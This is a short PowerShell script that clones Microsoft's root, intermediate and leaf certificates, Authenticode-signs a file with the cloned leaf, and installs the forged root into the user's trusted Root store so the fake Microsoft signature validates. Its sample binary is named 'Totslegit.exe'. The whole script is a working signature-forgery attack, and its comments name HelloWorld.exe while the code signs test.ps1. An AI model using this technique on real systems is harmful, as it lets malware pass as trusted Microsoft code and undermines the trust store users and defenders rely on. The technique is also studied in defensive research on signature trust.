##I didnt make this, thank Matt.

# We'll just store the cloned certificates in current user "Personal" store for now.
$CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }

$MS_Root_Cert = Get-PfxCertificate -FilePath C:\Test\MS-Cert\ms-root.cer
$Cloned_MS_Root_Cert = New-SelfSignedCertificate -CloneCert $MS_Root_Cert @CertStoreLocation

$MS_PCA_Cert = Get-PfxCertificate -FilePath C:\Test\MS-Cert\ms-pca.cer
$Cloned_MS_PCA_Cert = New-SelfSignedCertificate -CloneCert $MS_PCA_Cert -Signer $Cloned_MS_Root_Cert @CertStoreLocation

$MS_Leaf_Cert = Get-PfxCertificate -FilePath C:\Test\MS-Cert\ms-leaf.cer
$Cloned_MS_Leaf_Cert = New-SelfSignedCertificate -CloneCert $MS_Leaf_Cert -Signer $Cloned_MS_PCA_Cert @CertStoreLocation

# Create some sample code to practice signing on
Add-Type -TypeDefinition @'
public class Foo {
    public static void Main(string[] args) {
        System.Console.WriteLine("Hey, dont Screw up this time.");
        System.Console.ReadKey();
    }
}
'@ -OutputAssembly C:\Test\Totslegit.exe

# Validate that that HelloWorld.exe is not signed.
Get-AuthenticodeSignature -FilePath C:\Test\test.ps1

# Sign HelloWorld.exe with the cloned Microsoft leaf certificate.
Set-AuthenticodeSignature -Certificate $Cloned_MS_Leaf_Cert -FilePath C:\Test\test.ps1
# The certificate will not properly validate because the root certificate is not trusted.

# View the StatusMessage property to see the reason why Set-AuthenticodeSignature returned "UnknownError"
# "A certificate chain processed, but terminated in a root certificate which is not trusted by the trust provider"
Get-AuthenticodeSignature -FilePath C:\Test\test.ps1 | Format-List *

# Save the root certificate to disk and import it into the current user root store.
# Upon doing this, the HelloWorld.exe signature will validate properly.
Export-Certificate -Type CERT -FilePath C:\Test\MSKernel32Root_Cloned.cer -Cert $Cloned_MS_Root_Cert
Import-Certificate -FilePath C:\Test\MSKernel32Root_Cloned.cer -CertStoreLocation Cert:\CurrentUser\Root\

# You may need to start a new PowerShell process for the valid signature to take effect.
Get-AuthenticodeSignature -FilePath C:\Test\test.ps1
